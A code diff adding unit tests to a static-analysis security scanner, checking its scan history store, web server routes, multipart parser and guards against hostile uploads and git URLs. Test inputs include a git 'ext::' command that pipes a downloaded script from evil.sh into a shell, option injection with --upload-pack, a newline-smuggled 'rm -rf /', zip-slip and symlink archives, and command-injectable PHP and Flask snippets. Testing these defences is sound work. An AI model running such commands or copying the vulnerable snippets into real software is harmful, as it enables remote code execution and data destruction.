@@ -5,6 +5,7 @@ import io
 import json
 import os
 import tempfile
+import time
 import unittest
 
 from sast.advisory.db import Advisory, AdvisoryDB
@@ -1533,6 +1534,338 @@ class TestReachability(unittest.TestCase):
             modules={"org.apache.logging.log4j.LogManager"}, calls=set())
         state, _note = assess("org.apache.logging.log4j:log4j-core", "java", index)
         self.assertEqual(state, "imported")
+
+
+class TestWebStore(unittest.TestCase):
+    def _store(self):
+        from sast.web.store import ScanStore
+        return ScanStore(tempfile.mkdtemp(prefix="sast-store-"))
+
+    def test_history_survives_restart(self):
+        from sast.web.store import ScanStore
+        data_dir = tempfile.mkdtemp(prefix="sast-store-")
+        first = ScanStore(data_dir)
+        record = first.create("path", "/srv/app")
+        first.write_report(record.id, "<html>report</html>", '{"findings": []}')
+        first.close()
+
+        second = ScanStore(data_dir)
+        self.assertEqual(len(second.list()), 1)
+        self.assertEqual(second.read_report(record.id), "<html>report</html>")
+        second.close()
+
+    def test_restart_marks_running_scans_interrupted(self):
+        """A crash must not leave a row reading 'running' forever."""
+        from sast.web.store import INTERRUPTED, ScanStore
+        data_dir = tempfile.mkdtemp(prefix="sast-store-")
+        first = ScanStore(data_dir)
+        record = first.create("path", "/srv/app")   # left running
+        first.close()
+
+        second = ScanStore(data_dir)
+        self.assertEqual(second.get(record.id).status, INTERRUPTED)
+        second.close()
+
+    def test_delete_removes_record_and_report(self):
+        store = self._store()
+        record = store.create("path", "/srv/app")
+        store.write_report(record.id, "<html>x</html>")
+        report_file = store.report_path(record.id)
+        self.assertTrue(os.path.exists(report_file))
+        self.assertTrue(store.delete(record.id))
+        self.assertIsNone(store.get(record.id))
+        self.assertFalse(os.path.exists(report_file))
+        store.close()
+
+    def test_scan_id_cannot_escape_the_reports_directory(self):
+        store = self._store()
+        with self.assertRaises(ValueError):
+            store.report_path("../../etc/passwd")
+        store.close()
+
+
+class TestWebSourceHardening(unittest.TestCase):
+    """The web form accepts attacker-shaped input; these are the guards."""
+
+    def _zip(self, entries=None, symlink=None, absolute=False, traversal=False):
+        import io
+        import stat as _stat
+        import zipfile as _zip
+        buf = io.BytesIO()
+        with _zip.ZipFile(buf, "w") as z:
+            for name, content in (entries or {"ok.py": "x = 1\n"}).items():
+                z.writestr(name, content)
+            if symlink:
+                info = _zip.ZipInfo(symlink)
+                info.external_attr = (_stat.S_IFLNK | 0o777) << 16
+                z.writestr(info, "/etc/passwd")
+            if absolute:
+                z.writestr("/etc/cron.d/evil", "* * * * * root sh")
+            if traversal:
+                z.writestr("../../../../tmp/evil.sh", "#!/bin/sh\n")
+        return buf.getvalue()
+
+    def test_normal_archive_extracts(self):
+        from sast.web.sources import extract_zip
+        directory, _label, cleanup = extract_zip(
+            self._zip({"proj/app.py": "import os\n"}), "proj.zip")
+        try:
+            self.assertIn("app.py", os.listdir(directory))
+        finally:
+            cleanup()
+
+    def test_zip_slip_is_refused(self):
+        from sast.web.sources import SourceError, extract_zip
+        with self.assertRaises(SourceError) as ctx:
+            extract_zip(self._zip(traversal=True), "evil.zip")
+        self.assertIn("traversal", str(ctx.exception))
+
+    def test_absolute_path_entry_is_refused(self):
+        from sast.web.sources import SourceError, extract_zip
+        with self.assertRaises(SourceError):
+            extract_zip(self._zip(absolute=True), "evil.zip")
+
+    def test_symlink_entry_is_refused(self):
+        from sast.web.sources import SourceError, extract_zip
+        with self.assertRaises(SourceError) as ctx:
+            extract_zip(self._zip(symlink="link"), "evil.zip")
+        self.assertIn("symlink", str(ctx.exception))
+
+    def test_non_zip_upload_is_rejected_cleanly(self):
+        from sast.web.sources import SourceError, extract_zip
+        with self.assertRaises(SourceError):
+            extract_zip(b"definitely not a zip", "x.zip")
+
+    def test_git_url_allowlist(self):
+        from sast.web.sources import validate_git_url
+        for url in ("https://github.com/o/r.git", "http://host/r.git",
+                    "ssh://git@host/o/r.git", "git://host/r.git",
+                    "git@github.com:owner/repo.git"):
+            self.assertEqual(validate_git_url(url), url)
+
+    def test_git_ext_transport_is_refused(self):
+        """ext:: runs an arbitrary command — the classic git clone RCE."""
+        from sast.web.sources import SourceError, validate_git_url
+        with self.assertRaises(SourceError) as ctx:
+            validate_git_url('ext::sh -c "curl evil.sh | sh"')
+        self.assertIn("ext::", str(ctx.exception))
+
+    def test_git_option_injection_is_refused(self):
+        from sast.web.sources import SourceError, validate_git_url
+        for url in ("--upload-pack=/bin/sh", "-u /bin/sh"):
+            with self.assertRaises(SourceError):
+                validate_git_url(url)
+
+    def test_git_local_and_control_characters_refused(self):
+        from sast.web.sources import SourceError, validate_git_url
+        for url in ("file:///etc/passwd", "/etc/passwd",
+                    "https://h/r.git\nrm -rf /", "javascript:alert(1)"):
+            with self.assertRaises(SourceError):
+                validate_git_url(url)
+
+    def test_local_path_must_exist_and_be_a_directory(self):
+        from sast.web.sources import SourceError, resolve_local_path
+        with self.assertRaises(SourceError):
+            resolve_local_path("/definitely/not/here")
+        handle = tempfile.NamedTemporaryFile(delete=False)
+        handle.close()
+        with self.assertRaises(SourceError):
+            resolve_local_path(handle.name)
+
+
+class TestWebServer(unittest.TestCase):
+    """Routes, scanning, and the browser-facing protections."""
+
+    @classmethod
+    def setUpClass(cls):
+        import threading
+        from sast.web.server import make_server
+        cls.data_dir = tempfile.mkdtemp(prefix="sast-web-")
+        cls.httpd, cls.store, cls.service = make_server("127.0.0.1", 0, cls.data_dir)
+        cls.port = cls.httpd.server_address[1]
+        cls.base = f"http://127.0.0.1:{cls.port}"
+        cls.thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
+        cls.thread.start()
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.httpd.shutdown()
+        cls.httpd.server_close()
+        cls.store.close()
+
+    # -- helpers ---------------------------------------------------------
+    def _post(self, path, fields=None, files=None, headers=None):
+        import urllib.error
+        import urllib.request
+        boundary = "----sasttest"
+        body = b""
+        for key, value in (fields or {}).items():
+            body += (f'--{boundary}\r\nContent-Disposition: form-data; '
+                     f'name="{key}"\r\n\r\n{value}\r\n').encode()
+        for key, (name, data) in (files or {}).items():
+            body += (f'--{boundary}\r\nContent-Disposition: form-data; '
+                     f'name="{key}"; filename="{name}"\r\n'
+                     f'Content-Type: application/zip\r\n\r\n').encode() + data + b"\r\n"
+        body += f"--{boundary}--\r\n".encode()
+        req = urllib.request.Request(self.base + path, data=body, method="POST")
+        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
+        for key, value in (headers or {}).items():
+            req.add_header(key, value)
+        try:
+            with urllib.request.urlopen(req, timeout=60) as resp:
+                return resp.status, json.loads(resp.read())
+        except urllib.error.HTTPError as exc:
+            return exc.code, json.loads(exc.read())
+
+    def _get(self, path, headers=None):
+        import urllib.error
+        import urllib.request
+        req = urllib.request.Request(self.base + path)
+        for key, value in (headers or {}).items():
+            req.add_header(key, value)
+        try:
+            with urllib.request.urlopen(req, timeout=60) as resp:
+                return resp.status, resp.read()
+        except urllib.error.HTTPError as exc:
+            return exc.code, exc.read()
+
+    def _await(self, scan_id, timeout=120):
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            _code, raw = self._get(f"/api/scan/{scan_id}")
+            record = json.loads(raw)
+            if record["status"] != "running":
+                return record
+            time.sleep(0.2)
+        self.fail(f"scan {scan_id} did not finish")
+
+    # -- tests -----------------------------------------------------------
+    def test_index_serves_the_form(self):
+        code, body = self._get("/")
+        self.assertEqual(code, 200)
+        self.assertIn(b'id="form"', body)
+        for tab in (b"Local path", b"ZIP upload", b"Git repository"):
+            self.assertIn(tab, body)
+
+    def test_scan_local_path_and_serve_report(self):
+        src = tempfile.mkdtemp()
+        with open(os.path.join(src, "a.php"), "w") as fh:
+            fh.write('<?php system($_GET["c"]);')
+        code, payload = self._post("/start", {"source_type": "path", "path": src})
+        self.assertEqual(code, 202)
+        record = self._await(payload["id"])
+        self.assertEqual(record["status"], "done")
+        self.assertGreater(record["findings"], 0)
+
+        code, report = self._get(f"/report/{payload['id']}")
+        self.assertEqual(code, 200)
+        self.assertTrue(report.lstrip().startswith(b"<!DOCTYPE html>"))
+        self.assertIn(b"php-cmdi-system", report)
+
+        code, raw = self._get(f"/report/{payload['id']}.json")
+        self.assertEqual(code, 200)
+        self.assertIn("findings", json.loads(raw))
+
+    def test_scan_zip_upload(self):
+        import io
+        import zipfile as _zip
+        buf = io.BytesIO()
+        with _zip.ZipFile(buf, "w") as z:
+            z.writestr("proj/app.py",
+                       "import os\nfrom flask import request\n"
+                       "def h(): os.system(request.args['d'])\n")
+        code, payload = self._post("/start", {"source_type": "zip"},
+                                   {"archive": ("proj.zip", buf.getvalue())})
+        self.assertEqual(code, 202)
+        record = self._await(payload["id"])
+        self.assertEqual(record["status"], "done")
+        self.assertGreater(record["findings"], 0)
+        self.assertEqual(record["source_label"], "proj.zip")
+
+    def test_malicious_git_url_fails_the_scan_not_the_server(self):
+        code, payload = self._post(
+            "/start", {"source_type": "git", "git": 'ext::sh -c "id"', "branch": ""})
+        self.assertEqual(code, 202)
+        record = self._await(payload["id"])
+        self.assertEqual(record["status"], "failed")
+        self.assertIn("ext::", record["error"])
+        # The server is still serving afterwards.
+        self.assertEqual(self._get("/healthz")[0], 200)
+
+    def test_history_lists_scans(self):
+        code, raw = self._get("/api/scans")
+        self.assertEqual(code, 200)
+        self.assertIsInstance(json.loads(raw)["scans"], list)
+
+    def test_unknown_host_header_is_refused(self):
+        """Blocks a page on another origin from driving this server via DNS."""
+        code, _body = self._get("/", headers={"Host": "evil.example.com"})
+        self.assertEqual(code, 421)
+
+    def test_cross_origin_post_is_refused(self):
+        code, _payload = self._post("/start", {"source_type": "path", "path": "/tmp"},
+                                    headers={"Origin": "http://evil.example.com"})
+        self.assertEqual(code, 403)
+
+    def test_bad_source_type_is_rejected(self):
+        code, payload = self._post("/start", {"source_type": "wat"})
+        self.assertEqual(code, 400)
+        self.assertIn("error", payload)
+
+    def test_missing_path_is_rejected(self):
+        code, _payload = self._post("/start", {"source_type": "path", "path": ""})
+        self.assertEqual(code, 400)
+
+    def test_unknown_routes_404(self):
+        self.assertEqual(self._get("/nope")[0], 404)
+        self.assertEqual(self._get("/report/deadbeef")[0], 404)
+
+    def test_delete_scan(self):
+        src = tempfile.mkdtemp()
+        with open(os.path.join(src, "a.php"), "w") as fh:
+            fh.write("<?php echo 1;")
+        _code, payload = self._post("/start", {"source_type": "path", "path": src})
+        self._await(payload["id"])
+        code, result = self._post(f"/delete/{payload['id']}")
+        self.assertEqual(code, 200)
+        self.assertTrue(result["deleted"])
+        self.assertEqual(self._get(f"/api/scan/{payload['id']}")[0], 404)
+
+
+class TestMultipartParser(unittest.TestCase):
+    """cgi.FieldStorage was removed in 3.13, so this is hand-rolled."""
+
+    def _body(self, boundary, parts):
+        out = b""
+        for name, filename, data in parts:
+            disposition = f'form-data; name="{name}"'
+            if filename:
+                disposition += f'; filename="{filename}"'
+            out += (f"--{boundary}\r\nContent-Disposition: {disposition}\r\n\r\n"
+                    ).encode() + data + b"\r\n"
+        return out + f"--{boundary}--\r\n".encode()
+
+    def test_fields_and_binary_file(self):
+        from sast.web import multipart
+        blob = bytes(range(256)) * 4
+        body = self._body("abc123", [
+            ("source_type", "", b"zip"),
+            ("archive", "x.zip", blob),
+        ])
+        parts = multipart.parse(body, "multipart/form-data; boundary=abc123")
+        self.assertEqual(parts["source_type"].text, "zip")
+        self.assertEqual(parts["archive"].data, blob)
+        self.assertEqual(parts["archive"].filename, "x.zip")
+
+    def test_quoted_boundary(self):
+        from sast.web import multipart
+        body = self._body("xy", [("a", "", b"1")])
+        parts = multipart.parse(body, 'multipart/form-data; boundary="xy"')
+        self.assertEqual(parts["a"].text, "1")
+
+    def test_missing_boundary_yields_nothing(self):
+        from sast.web import multipart
+        self.assertEqual(multipart.parse(b"junk", "multipart/form-data"), {})
 
 
 if __name__ == "__main__":
